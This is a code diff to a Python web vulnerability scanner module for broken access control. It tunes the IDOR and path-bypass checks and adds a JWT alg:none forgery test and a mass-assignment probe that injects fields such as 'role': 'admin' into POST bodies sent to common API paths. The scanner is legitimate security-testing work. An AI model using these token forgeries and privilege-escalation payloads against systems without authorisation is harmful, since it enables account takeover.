@@ -2,22 +2,21 @@
 Broken Access Control Scanner Module
 
 Checks for:
-1. IDOR           — parameter ID tampering to access other users' data
-2. Forced Browsing — direct access to restricted/admin paths without auth
+1. IDOR              — parameter ID tampering
+2. Forced Browsing   — direct access to restricted/admin paths
 3. Privilege Escalation — role/admin parameter manipulation
-4. Missing Auth   — sensitive endpoints accessible without credentials
-5. Method Tampering — GET→POST→PUT→DELETE on restricted endpoints
-
-Bypass techniques:
-- Parameter tampering (IDs, roles)
-- URL path manipulation (path traversal, case, suffix tricks)
-- Header bypasses (X-Original-URL, X-Rewrite-URL, X-Forwarded-For)
-- Cookie/token role manipulation
+4. Missing Auth      — sensitive endpoints accessible without credentials
+5. Method Tampering  — HTTP verb abuse
+6. Header Bypass     — X-Original-URL, X-Rewrite-URL tricks
+7. JWT Alg:None      — strip JWT signature + set alg to none
+8. Mass Assignment   — inject admin/role fields into JSON POST bodies
 """
 
 import httpx
 import asyncio
 import uuid
+import json
+import base64
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
 from typing import List, Dict, Tuple, Optional
 from models.bac_models import (
@@ -227,10 +226,14 @@ async def test_idor(
                 resp = await client.get(tampered_url, timeout=timeout)
                 diff = abs(len(resp.text) - baseline_len)
 
-                if (resp.status_code == 200
-                        and diff > 100
-                        and resp.status_code == baseline_status
-                        and str(t_id) != str(v)):
+                # Raised threshold to 500 bytes to avoid FP on pages with volatile
+                # dynamic content (ads, timestamps, random tokens, etc.)
+                if (
+                    resp.status_code == 200
+                    and diff > 500
+                    and resp.status_code == baseline_status
+                    and str(t_id) != str(v)
+                ):
                     findings.append(BACFinding(
                         check_type=BACType.IDOR,
                         bypass_technique=BypassTechnique.PARAM_TAMPER,
@@ -241,8 +244,8 @@ async def test_idor(
                         tampered_value=str(t_id),
                         evidence=(
                             f"Parameter '{p}' changed from '{v}' → '{t_id}' "
-                            f"returned HTTP 200 with different content "
-                            f"(size diff: {diff} bytes)"
+                            f"returned HTTP 200 with significantly different content "
+                            f"(size diff: {diff} bytes — threshold: 500)"
                         ),
                         severity=SeverityLevel.HIGH,
                         description=(
@@ -366,6 +369,16 @@ async def test_path_bypass(
             try:
                 resp = await client.get(bypass_url, timeout=timeout)
                 if resp.status_code == 200 and len(resp.text) > 200:
+                    # Require sensitive content OR JSON data — a generic landing page
+                    # returning 200 after a URL trick should NOT automatically be CRITICAL.
+                    sensitive, evidence = has_sensitive_content(resp.text)
+                    content_type = resp.headers.get("content-type", "")
+                    is_json_data = "application/json" in content_type
+
+                    if not sensitive and not is_json_data:
+                        return  # Not enough evidence — likely a generic redirect/landing page
+
+                    severity = SeverityLevel.CRITICAL if sensitive else SeverityLevel.HIGH
                     findings.append(BACFinding(
                         check_type=BACType.FORCED_BROWSING,
                         bypass_technique=BypassTechnique.URL_MANIPULATION,
@@ -374,13 +387,16 @@ async def test_path_bypass(
                         original_value=f"{path} → 403",
                         tampered_value=bypass_path,
                         evidence=(
+                            evidence or
                             f"URL manipulation trick '{trick}' bypassed 403 on '{path}' "
-                            f"and returned HTTP 200 ({len(resp.text)} bytes)"
+                            f"and returned HTTP 200 with JSON data ({len(resp.text)} bytes)"
                         ),
-                        severity=SeverityLevel.CRITICAL,
+                        severity=severity,
+                        confidence=ConfidenceLevel.HIGH if sensitive else ConfidenceLevel.MEDIUM,
                         description=(
                             f"A URL manipulation trick bypassed access control on '{path}'. "
-                            f"The server returned 403 for the direct path but 200 for the manipulated version."
+                            f"The server returned 403 for the direct path but 200 for the "
+                            f"manipulated version with {'sensitive content' if sensitive else 'JSON data'}."
                         ),
                         remediation=(
                             "Normalize all URL paths server-side before applying access control. "
@@ -831,11 +847,291 @@ async def test_header_bypass(
     await asyncio.gather(*header_tasks)
 
 
+
+# ──────────────────────────────────────────────
+# 7. JWT Algorithm Confusion — alg:none Attack
+# ──────────────────────────────────────────────
+
+def _b64url_decode(data: str) -> bytes:
+    """Base64url decode with padding."""
+    padded = data + "=" * (4 - len(data) % 4)
+    return base64.urlsafe_b64decode(padded)
+
+
+def _b64url_encode(data: bytes) -> str:
+    """Base64url encode without padding."""
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+
+def _forge_alg_none_jwt(token: str) -> Optional[str]:
+    """
+    Given a valid JWT, return a forged version with:
+      - alg set to 'none' / 'None' / 'NONE'
+      - signature stripped
+    Returns None if token is not a valid 3-part JWT.
+    """
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    try:
+        header_json = json.loads(_b64url_decode(parts[0]))
+        header_json["alg"] = "none"
+        new_header = _b64url_encode(json.dumps(header_json, separators=(",", ":")).encode())
+        # alg:none JWT has no signature — just header.payload.
+        return f"{new_header}.{parts[1]}."
+    except Exception:
+        return None
+
+
+def _extract_jwt_from_headers(headers: dict) -> Optional[str]:
+    """Look for a JWT in the Authorization header (Bearer scheme)."""
+    auth = headers.get("Authorization", "") or headers.get("authorization", "")
+    if auth.startswith("Bearer "):
+        token = auth[7:].strip()
+        if len(token.split(".")) == 3:
+            return token
+    return None
+
+
+def _extract_jwt_from_cookies(cookies) -> Optional[str]:
+    """Look for a JWT-like value in cookies."""
+    for name, value in cookies.items():
+        if isinstance(value, str) and len(value.split(".")) == 3:
+            try:
+                _b64url_decode(value.split(".")[0])
+                return value
+            except Exception:
+                continue
+    return None
+
+
+async def test_jwt_alg_none(
+    client: httpx.AsyncClient,
+    url: str,
+    timeout: int,
+    findings: List[BACFinding],
+    errors: List[str],
+    checks: List[str],
+):
+    """
+    Test for JWT algorithm confusion vulnerability (alg:none attack).
+
+    Steps:
+      1. Make a baseline request and look for JWTs in headers/cookies.
+      2. Forge a tampered JWT with alg=none and no signature.
+      3. Replay the request with the forged token.
+      4. If the server accepts it (same or expanded response), report CRITICAL.
+    """
+    checks.append("JWT_ALG_NONE")
+    try:
+        baseline_resp = await client.get(url, timeout=timeout)
+        baseline_body = baseline_resp.text
+        baseline_status = baseline_resp.status_code
+
+        # Find a JWT — check headers first, then cookies
+        token = (_extract_jwt_from_headers(dict(baseline_resp.headers))
+                 or _extract_jwt_from_cookies(dict(client.cookies))
+                 or _extract_jwt_from_cookies(dict(baseline_resp.cookies)))
+
+        if not token:
+            return
+
+        forged = _forge_alg_none_jwt(token)
+        if not forged:
+            return
+
+        # Try each alg:none variant (servers may check case-sensitively)
+        for alg_variant in ["none", "None", "NONE"]:
+            try:
+                header_json = json.loads(_b64url_decode(token.split(".")[0]))
+                header_json["alg"] = alg_variant
+                new_header = _b64url_encode(json.dumps(header_json, separators=(",", ":")).encode())
+                forged_variant = f"{new_header}.{token.split('.')[1]}."
+
+                resp = await client.get(
+                    url,
+                    headers={"Authorization": f"Bearer {forged_variant}"},
+                    timeout=timeout,
+                )
+
+                # If server responds with 200 (or same status as baseline) to a signature-less token
+                if resp.status_code == 200 and resp.status_code == baseline_status:
+                    sensitive, evidence = has_sensitive_content(resp.text)
+                    body_changed = significant_body_diff(resp.text, baseline_body)
+
+                    if sensitive or not body_changed:
+                        findings.append(BACFinding(
+                            check_type=BACType.PRIVILEGE_ESCALATION,
+                            bypass_technique=BypassTechnique.HEADER_BYPASS,
+                            target_url=url,
+                            method="GET",
+                            parameter="Authorization: Bearer (JWT)",
+                            original_value=token[:30] + "...",
+                            tampered_value=forged_variant[:30] + "...",
+                            evidence=(
+                                f"Server accepted JWT with alg='{alg_variant}' and NO signature. "
+                                f"HTTP {resp.status_code} returned with {'sensitive content' if sensitive else 'unchanged body'}."
+                            ),
+                            severity=SeverityLevel.CRITICAL,
+                            confidence=ConfidenceLevel.HIGH,
+                            description=(
+                                "The server accepts JWTs with algorithm set to 'none', which disables "
+                                "cryptographic signature verification entirely. An attacker can forge any "
+                                "JWT payload (e.g. set admin:true, user_id:<any>) without knowing the secret."
+                            ),
+                            remediation=(
+                                "Explicitly validate the 'alg' header field in JWT verification. "
+                                "Reject tokens with alg='none'. "
+                                "Use asymmetric algorithms (RS256, ES256) instead of HS256 where possible. "
+                                "Use a battle-tested JWT library that rejects alg confusion by default."
+                            ),
+                        ))
+                        return
+            except Exception as e:
+                errors.append(f"JWT alg:{alg_variant} test error: {str(e)}")
+
+    except Exception as e:
+        errors.append(f"JWT alg:none test error on {url}: {str(e)}")
+
+
+# ──────────────────────────────────────────────
+# 8. Mass Assignment Attack
+# ──────────────────────────────────────────────
+
+MASS_ASSIGNMENT_FIELDS = [
+    {"admin": True},
+    {"admin": 1},
+    {"role": "admin"},
+    {"role": "administrator"},
+    {"isAdmin": True},
+    {"is_admin": True},
+    {"privilege": "admin"},
+    {"user_type": "admin"},
+    {"access_level": 9},
+    {"permissions": ["admin", "write", "delete"]},
+    {"verified": True},
+    {"active": True, "role": "admin"},
+    {"_id": 1},
+    {"id": 1},
+    {"userId": 1},
+]
+
+# Common JSON API endpoints to probe for mass assignment
+MASS_ASSIGNMENT_PATHS = [
+    "/api/user/update",
+    "/api/users/update",
+    "/api/profile/update",
+    "/api/account/update",
+    "/api/settings",
+    "/api/user",
+    "/api/register",
+    "/api/signup",
+    "/api/v1/user/update",
+    "/api/v1/profile",
+]
+
+
+async def test_mass_assignment(
+    client: httpx.AsyncClient,
+    url: str,
+    timeout: int,
+    findings: List[BACFinding],
+    errors: List[str],
+    checks: List[str],
+):
+    """
+    Test for Mass Assignment vulnerabilities.
+
+    Probes JSON POST/PUT endpoints by injecting privilege-escalation fields
+    ('admin':true, 'role':'admin', etc.) and look for:
+      - Sensitive keywords in response (evidence of privilege being applied)
+      - Status code changes (auth state changes)
+      - Significant response body differences
+    """
+    checks.append("MASS_ASSIGNMENT")
+    base_url = get_base_url(url)
+    json_headers = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+    }
+
+    # Also test the current URL path
+    paths_to_test = MASS_ASSIGNMENT_PATHS + [urlparse(url).path]
+
+    semaphore = asyncio.Semaphore(5)
+
+    async def _test_path_fields(path, extra_fields):
+        async with semaphore:
+            target = base_url + path
+            checks.append(f"MASSASSIGN:{target}")
+            try:
+                # Baseline with empty object
+                baseline_resp = await client.post(
+                    target,
+                    json={},
+                    headers=json_headers,
+                    timeout=timeout,
+                )
+                baseline_body = baseline_resp.text
+
+                # Inject escalation fields
+                tampered_resp = await client.post(
+                    target,
+                    json=extra_fields,
+                    headers=json_headers,
+                    timeout=timeout,
+                )
+
+                if tampered_resp.status_code in (200, 201):
+                    sensitive, evidence = has_sensitive_content(tampered_resp.text)
+                    body_changed = significant_body_diff(tampered_resp.text, baseline_body)
+
+                    if sensitive and body_changed:
+                        field_str = json.dumps(extra_fields)
+                        findings.append(BACFinding(
+                            check_type=BACType.PRIVILEGE_ESCALATION,
+                            bypass_technique=BypassTechnique.PARAM_TAMPER,
+                            target_url=target,
+                            method="POST",
+                            parameter="JSON body (mass assignment)",
+                            original_value="{}",
+                            tampered_value=field_str[:100],
+                            evidence=(
+                                f"{evidence} — injected {field_str[:80]} into POST body "
+                                f"and received HTTP {tampered_resp.status_code} with sensitive content"
+                            ),
+                            severity=SeverityLevel.HIGH,
+                            confidence=ConfidenceLevel.HIGH,
+                            description=(
+                                f"The endpoint '{path}' accepted mass-assigned privilege fields. "
+                                f"Injecting {list(extra_fields.keys())} into the JSON body produced "
+                                f"a response containing sensitive content, indicating the server "
+                                f"applied the supplied role/privilege values."
+                            ),
+                            remediation=(
+                                "Use an allowlist (whitelist) of permitted fields when binding request body to models. "
+                                "Never directly bind raw JSON to ORM/database models. "
+                                "Use DTOs (Data Transfer Objects) that only expose safe fields. "
+                                "Apply role checks on the server — never trust client-supplied privilege flags."
+                            ),
+                        ))
+            except Exception:
+                pass
+
+    tasks = [
+        _test_path_fields(path, fields)
+        for path in paths_to_test
+        for fields in MASS_ASSIGNMENT_FIELDS[:8]  # Test top 8 field sets
+    ]
+    await asyncio.gather(*tasks)
+
+
 # ──────────────────────────────────────────────
 # Main Scanner Entry Point
 # ──────────────────────────────────────────────
 
 async def run_bac_scan(
+
     urls: List[str],
     timeout: int = 10,
     cookies: Dict = None,
@@ -907,6 +1203,8 @@ async def run_bac_scan(
                 test_missing_auth(client, url, timeout, findings, errors, checks, catch_all_status, catch_all_body),
                 test_method_tampering(client, url, timeout, findings, errors, checks),
                 test_header_bypass(client, url, timeout, findings, errors, checks, catch_all_status, catch_all_body),
+                test_jwt_alg_none(client, url, timeout, findings, errors, checks),
+                test_mass_assignment(client, url, timeout, findings, errors, checks),
             )
 
     # Deduplicate by (check_type, target_url, parameter, tampered_value)
